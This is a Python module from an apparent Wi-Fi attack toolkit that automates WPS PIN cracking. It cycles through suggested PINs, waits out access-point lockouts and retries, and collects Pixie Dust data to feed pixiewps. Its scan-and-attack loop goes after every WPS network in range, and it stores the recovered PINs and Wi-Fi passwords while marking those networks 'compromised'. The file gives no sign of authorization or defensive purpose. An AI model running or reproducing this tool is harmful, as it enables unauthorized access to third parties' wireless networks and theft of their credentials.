#!/usr/bin/env python3
"""
Auto-WPS Engine
- Monitors WPS lock status
- Automatically retries when lock clears
- Runs continuous attack cycle
- Supports all attack types
"""

import time
import re
import subprocess
import sys
from pathlib import Path
from datetime import datetime

sys.path.insert(0, str(Path(__file__).parent.parent))
from modules.wpa_engine import WpsEngine
from modules.wps_pins import suggest_pins, detect_manufacturer


class AutoWPS:
    """Automated WPS attack with lock monitoring and auto-retry"""

    def __init__(self, interface, db=None):
        self.interface = interface
        self.db = db
        self.running = False
        self.results = []
        self.callback = None

    def auto_attack(self, bssid, essid="", max_cycles=100, lock_wait=60):
        """
        Automated WPS attack cycle:
        1. Try best PINs
        2. If locked → wait and monitor
        3. When unlocked → try again
        4. Repeat until success or max cycles
        """
        self.running = True
        self.results = []

        # Get smart PIN suggestions
        pins = suggest_pins(bssid)
        pin_list = [p["pin"] for p in pins]

        self._log(f"Target: {essid} ({bssid})")
        self._log(f"PINs to try: {len(pin_list)}")
        self._log(f"Max cycles: {max_cycles}")
        self._log(f"Lock wait: {lock_wait}s")
        self._log("")

        cycle = 0
        pin_index = 0

        while self.running and cycle < max_cycles:
            cycle += 1

            if pin_index >= len(pin_list):
                pin_index = 0  # Loop PIN list

            pin = pin_list[pin_index]
            self._log(f"=== Cycle {cycle}/{max_cycles} | PIN: {pin} ===")

            # Start wpa_supplicant engine
            engine = WpsEngine(self.interface)
            ok, msg = engine.start()

            if not ok:
                self._log(f"Engine error: {msg}")
                time.sleep(5)
                continue

            engine.callback = self._engine_callback

            try:
                result = engine.wps_pin_attack(bssid, pin, timeout=45)
            except Exception as e:
                self._log(f"Error: {e}")
                result = {"status": "error"}
            finally:
                engine.stop()

            status = result.get("status", "unknown")

            if status == "success":
                self._log("")
                self._log("=" * 50)
                self._log(f"SUCCESS! PIN: {result.get('pin')}")
                self._log(f"PSK: {result.get('psk')}")
                self._log("=" * 50)
                self._save_result(bssid, essid, result)
                self.running = False
                return result

            elif status == "locked":
                self._log(f"LOCKED. Waiting {lock_wait}s...")
                self._wait_with_countdown(lock_wait)
                # Don't increment pin_index - retry same PIN
                continue

            elif status == "wrong_pin":
                self._log(f"Wrong PIN. Next...")
                pin_index += 1

            elif status == "timeout":
                self._log("Timeout. Retrying...")
                # Don't increment - retry same PIN

            elif status == "data_collected":
                pixie = result.get("pixie_data", {})
                collected = sum(1 for k, v in pixie.items() if v and k != "BSSID")
                self._log(f"Collected {collected}/7 data fields")
                if collected >= 4:
                    self._log("Enough data for pixiewps!")
                    pin_result = self._try_pixiewps(bssid, pixie)
                    if pin_result:
                        self._log(f"PIXIEWPS PIN: {pin_result}")
                        # Verify PIN
                        verify = self._verify_pin(bssid, pin_result)
                        if verify:
                            self._log("PIN VERIFIED!")
                            self.running = False
                            return verify

                pin_index += 1

            else:
                pin_index += 1

            time.sleep(2)  # Brief pause between attempts

        self._log(f"Max cycles ({max_cycles}) reached")
        self.running = False
        return {"status": "exhausted"}

    def auto_scan_and_attack(self, scanner_func=None, max_targets=10):
        """
        Continuously scan and attack WPS networks:
        1. Scan for networks
        2. Find open WPS targets
        3. Attack each one
        4. Repeat
        """
        self.running = True
        attacked = set()

        while self.running:
            self._log("=== Scanning for WPS networks... ===")

            if scanner_func:
                networks = scanner_func(self.interface)
            else:
                networks = self._quick_scan()

            wps_nets = [n for n in networks if n.get("has_wps")]
            self._log(f"Found {len(wps_nets)} WPS networks")

            for net in wps_nets:
                if not self.running:
                    break

                bssid = net["bssid"]
                if bssid in attacked:
                    continue

                essid = net.get("essid", "Unknown")
                lock = net.get("wps_locked", "Unknown")

                self._log(f"\nTarget: {essid} ({bssid}) Lock:{lock}")

                if lock == "Yes":
                    self._log("Locked - trying anyway (may unlock)")
                elif lock == "No":
                    self._log("Open WPS - high chance!")

                result = self.auto_attack(bssid, essid, max_cycles=20)
                attacked.add(bssid)

                if result.get("status") == "success":
                    self._log(f"CREDENTIALS FOUND for {essid}!")

            # Wait before next scan cycle
            self._log("\nWaiting 60s before next scan...")
            self._wait_with_countdown(60)

    def monitor_lock(self, bssid, timeout=3600):
        """
        Monitor WPS lock status over time.
        Tries PIN periodically to check if lock has cleared.
        """
        self.running = True
        start = time.time()

        self._log(f"Monitoring WPS lock on {bssid}")
        self._log("Will try PIN every 30s to detect unlock")
        self._log("")

        attempt = 0
        while self.running and (time.time() - start) < timeout:
            attempt += 1
            elapsed = int(time.time() - start)

            engine = WpsEngine(self.interface)
            ok, _ = engine.start()
            if not ok:
                time.sleep(10)
                continue

            engine.callback = self._engine_callback
            result = engine.wps_pin_attack(bssid, "12345670", timeout=20)
            engine.stop()

            status = result.get("status")
            self._log(f"[{elapsed}s] Attempt {attempt}: {status}")

            if status == "success":
                return result
            elif status != "locked":
                self._log("LOCK CLEARED! Starting full attack...")
                return self.auto_attack(bssid)

            # Wait before next check
            self._wait_with_countdown(30)

        self._log("Monitor timeout reached")
        return {"status": "timeout"}

    def _try_pixiewps(self, bssid, pixie_data):
        """Run pixiewps with collected data"""
        import shutil
        if not shutil.which("pixiewps"):
            self._log("pixiewps not installed!")
            return None

        cmd = [
            "pixiewps",
            "--pke", pixie_data.get("PKE", ""),
            "--pkr", pixie_data.get("PKR", ""),
            "--e-hash1", pixie_data.get("E_HASH1", ""),
            "--e-hash2", pixie_data.get("E_HASH2", ""),
            "--authkey", pixie_data.get("AUTHKEY", ""),
            "--e-nonce", pixie_data.get("E_NONCE", ""),
            "--r-nonce", pixie_data.get("R_NONCE", ""),
            "--e-bssid", bssid.replace(":", ""),
            "--mode", "1,2,3,4,5",
            "--force",
        ]

        # Remove empty args
        cmd = [c for c in cmd if c]

        try:
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            self._log(r.stdout)
            if r.returncode == 0:
                for line in r.stdout.split("\n"):
                    if "WPS pin" in line and "[+]" in line:
                        pin = line.split(":")[-1].strip()
                        if pin and pin != "<empty>":
                            return pin
        except Exception as e:
            self._log(f"pixiewps error: {e}")
        return None

    def _verify_pin(self, bssid, pin):
        """Verify a PIN by trying to connect"""
        self._log(f"Verifying PIN: {pin}")
        engine = WpsEngine(self.interface)
        ok, _ = engine.start()
        if not ok:
            return None

        engine.callback = self._engine_callback
        result = engine.wps_pin_attack(bssid, pin, timeout=60)
        engine.stop()

        if result.get("status") == "success":
            return result
        return None

    def _quick_scan(self):
        """Quick scan using iw"""
        try:
            subprocess.run(["ip", "link", "set", self.interface, "up"],
                          capture_output=True, timeout=5)
            time.sleep(1)
            r = subprocess.run(["iw", "dev", self.interface, "scan"],
                              capture_output=True, text=True, timeout=20)
            if r.returncode != 0:
                return []

            networks = []
            cur = None
            for line in r.stdout.split("\n"):
                line = line.strip().lstrip("\t")
                m = re.match(r"BSS ([0-9a-fA-F:]{17})", line)
                if m:
                    if cur and cur.get("has_wps"):
                        networks.append(cur)
                    cur = {"bssid": m.group(1).upper(), "essid": "",
                           "channel": 0, "rssi": 0, "has_wps": 0,
                           "wps_locked": "Unknown"}
                    continue
                if not cur:
                    continue
                m2 = re.match(r"SSID: (.*)", line)
                if m2:
                    cur["essid"] = m2.group(1).strip() or "Hidden"
                m2 = re.match(r"signal: ([+-]?[0-9.]+) dBm", line)
                if m2:
                    cur["rssi"] = int(float(m2.group(1)))
                m2 = re.match(r"freq: (\d+)", line)
                if m2:
                    f = int(m2.group(1))
                    if 2412 <= f <= 2484:
                        cur["channel"] = 14 if f == 2484 else (f - 2412) // 5 + 1
                m2 = re.match(r"WPS:\t", line)
                if m2:
                    cur["has_wps"] = 1
                m2 = re.search(r"AP setup locked: (0x[0-9a-fA-F]+)", line)
                if m2:
                    cur["wps_locked"] = "Yes" if int(m2.group(1), 16) else "No"

            if cur and cur.get("has_wps"):
                networks.append(cur)

            networks.sort(key=lambda x: x["rssi"], reverse=True)
            return networks
        except Exception:
            return []

    def _wait_with_countdown(self, seconds):
        """Wait with countdown display"""
        for remaining in range(seconds, 0, -1):
            if not self.running:
                break
            m, s = divmod(remaining, 60)
            sys.stdout.write(f"\r  Waiting: {m:02d}:{s:02d} ")
            sys.stdout.flush()
            time.sleep(1)
        sys.stdout.write("\r                      \r")

    def _engine_callback(self, line):
        """Forward engine output"""
        if self.callback:
            self.callback(line)

    def _log(self, msg):
        """Log message"""
        ts = datetime.now().strftime("%H:%M:%S")
        full = f"[{ts}] {msg}"
        if self.callback:
            self.callback(full)
        else:
            print(full)

    def _save_result(self, bssid, essid, result):
        """Save successful result"""
        self.results.append({
            "bssid": bssid, "essid": essid,
            "pin": result.get("pin"), "psk": result.get("psk"),
            "time": datetime.now().isoformat(),
        })
        if self.db:
            self.db.add_credential(
                bssid, essid,
                result.get("pin"), result.get("psk"),
                "Auto-WPS"
            )
            self.db.execute(
                "UPDATE networks SET status='compromised' WHERE bssid=?",
                (bssid,)
            )

    def stop(self):
        """Stop all operations"""
        self.running = False
